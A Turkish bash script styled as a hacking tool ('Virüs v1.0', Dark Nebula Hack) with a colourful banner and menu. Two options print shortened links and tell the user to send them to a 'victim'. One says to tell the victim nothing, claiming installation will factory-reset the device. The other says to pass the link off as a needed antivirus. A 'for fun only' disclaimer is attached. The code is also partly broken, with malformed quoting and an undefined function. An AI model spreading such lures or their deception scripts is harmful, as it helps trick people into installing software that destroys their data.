#!/bin/bash

red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"

banner(){
clear
echo -e "${ylo}               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
echo -e "${grn}X  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx"
echo -e "${grn} X# \.X        @#%,.@   Virüs v1.0      @#%,.@        "
echo -e "${grn}                @#%,.@              @#%,.@          "
echo -e "${grn}                  @#%,.@          @#%,.@            "
echo -e "${grn}                     @#%,.@      @#%,.@             "
echo -e "${grn}                       @#%.,@  @#%,.@              "
echo -e "${pink}                        Dark Nebula Hack$rset"
echo " " 
echo -e "${red}                       ▶Kodlayan$grn yigitreal$red◀$rset"
echo -e "${red}                      ⫸$ylo  Dark Nebula Hack$red ⫷$rset"
echo 
echo -e "${red}                    [Eğlence ile bulaşın]$rset"
echo " "
echo " "
}

menu(){
echo -e "${grn}             ＞＞＞＞>>>＞$ylo [Seçenekler]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "${red}                        ➡$cyan [\e[92m1\e[96m] Şimdi Bulaş"
echo -e "${red}                        ➡$cyan [\e[92m2\e[96m] Şimdi Kaydet"
echo -e "${red}                        ➡$cyan [\e[92m3\e[96m] Hakkında"
echo -e "${red}                        ➡$cyan [\e[92m4\e[96m] Betiği Güncelle"
echo -e "${red}                        ➡$cyan [\e[92m5\e[96m] TELEGRAM"
echo -e "${red}                        ➡$cyan [\e[92m6\e[96m] Daha Fazla"
echo -e "${red}                        ➡$cyan [\e[92m7\e[96m] Sohbet"
echo -e "${red}                        ➡$cyan [\e[92m8\e[96m] Çıkış"
echo " "
echo " "
echo -e "${grn}               >＞＞＞＞＞$ylo [SEÇİM]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#SEÇENEK SEÇİNİZ\e[92m: "
read optnz
case $optnz in
    1)
    virus ;;
    2)
    save ;;
    3)
    about ;;
    4)
    upd ;;
    5|6|7)
    am start -a android.intent.action.VIEW -d https://t.me/darknebulahack > /dev/null 2>&1
    banner
    menu ;;
    8)
    exit 1 ;;
    *)
    echo "yanlış"
    exit ;;
esac
}

virus(){
clear
echo
echo -e "${grn} 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) "
echo " "
echo -e "${red} 😈  Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin 
ve ona hiçbir şey söylemeyin. Cihazına kurduğunda 
fabrika ayarlarına sıfırlanacak ve daha fazlası olacak."
echo -e "${ylo}                                👇👇👇"
echo -e "${blue}         L1NK :- ${cyan}https://bit.ly/3YciaDF"
echo -e "${ylo}                                👆👆👆"
echo -e "${pink}Sadece eğlence amaçlı kullanın, başkalarına zarar vermek için değil 😇✌️."
echo -e "${pink}Ve kanalımız bu betikle başkalarına verdiğiniz herhangi bir zarardan sorumlu değil."
echo
echo -ne "\e[92m#Çıkmak için exit yazın : "
read exitz
if [ "$exitz" = "exit" ]; then
    banner
    menu
else
    banner
    menu
fi
}

save(){
clear
echo
echo -e "${grn} 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) "
echo " "
echo -e "${ylo}  Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin ve ona 
cihazını kurması gerektiğini ya da cihazının kurtarılamayacağını 
söyleyin (Antivirüs)"
echo -e "${ylo}                    👇👇👇"
echo -e "${blue}        L1NK :- ${cyan}https://bit.ly/3fX8ljZ"
echo -e "${ylo}                    👆👆👆"
echo -e "${pink}Sadece eğlence amaçlı kullanın, başkalarına zarar vermek için değil 😇✌️."
echo -e "${pink}Ve kanalımız bu betikle başkalarına verdiğiniz herhangi bir zarardan sorumlu değil."
echo
echo -ne "\e[92m#Çıkmak için exit yazın : "
read exitz
if [ "$exitz" = "exit" ]; then
    banner
    menu
else
    banner
    menu
fi
}

about(){
clear
# Hakkında bölümü buraya ekleyebilirsiniz.
# Örneğin:
echo "Bu betik eğlence amaçlıdır. Kullanımından doğabilecek herhangi bir sorumluluk kullanıcıya aittir."
echo " "
echo "Kodlayan: yigitreal"
echo " "
echo "Dark Nebula Hack"
echo " "
echo -ne "\e[92m#Geri dönmek için enter tuşuna basın : "
read back
banner
menu
}

banner
menu
